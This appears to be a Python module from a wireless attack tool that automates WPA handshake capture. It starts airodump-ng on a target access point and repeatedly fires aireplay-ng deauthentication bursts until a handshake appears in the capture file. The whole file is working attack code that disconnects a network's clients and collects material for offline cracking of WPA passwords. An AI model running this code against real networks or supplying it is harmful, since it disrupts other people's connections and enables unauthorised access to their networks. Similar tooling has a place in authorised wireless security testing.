import os
import time
import subprocess
from ..utils.system import run_command
from ..ui.display import print_info, print_warning, print_success, print_error, Colors
from .operations import check_handshake_captured


def capture_handshake_automatic(interface, bssid, channel, output_file, essid):
    """Automatically capture WPA handshake with continuous deauth"""
    print_info(f"Starting automatic handshake capture for: {essid}")
    print_info(f"Channel: {channel} | BSSID: {bssid}")
    print_warning("The tool will automatically deauth and check for handshake")
    print_warning("This may take 30-120 seconds depending on network activity\n")

    cap_file          = f"{output_file}-01.cap"
    handshake_captured = False
    attempt           = 0
    max_attempts      = 20

    airodump_cmd = [
        'airodump-ng', '-w', output_file,
        '-c', str(channel), '--bssid', bssid, interface
    ]

    print_info("Starting packet capture...")
    airodump_process = subprocess.Popen(
        airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    try:
        while not handshake_captured and attempt < max_attempts:
            attempt += 1
            print(
                f"{Colors.WARNING}[Attempt {attempt}/{max_attempts}] "
                f"Sending deauth packets...{Colors.ENDC}", end='\r'
            )

            deauth_process = subprocess.Popen(
                ['aireplay-ng', '--deauth', '5', '-a', bssid, interface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(8)
            deauth_process.terminate()

            if check_handshake_captured(cap_file, bssid):
                handshake_captured = True
                print(f"\n{Colors.OKGREEN}{Colors.BOLD}🎉 HANDSHAKE CAPTURED! 🎉{Colors.ENDC}")
                break

            time.sleep(2)

        if not handshake_captured:
            print(f"\n{Colors.WARNING}Handshake not captured after {max_attempts} attempts{Colors.ENDC}")
            print_info("Tips:")
            print("  - Make sure devices are connected to the network")
            print("  - Try moving closer to the access point")
            print("  - The network might not have active clients")

    finally:
        airodump_process.terminate()
        time.sleep(2)
        airodump_process.kill()

    if handshake_captured and os.path.exists(cap_file):
        print_success(f"Capture saved: {cap_file}")
        return cap_file
    return None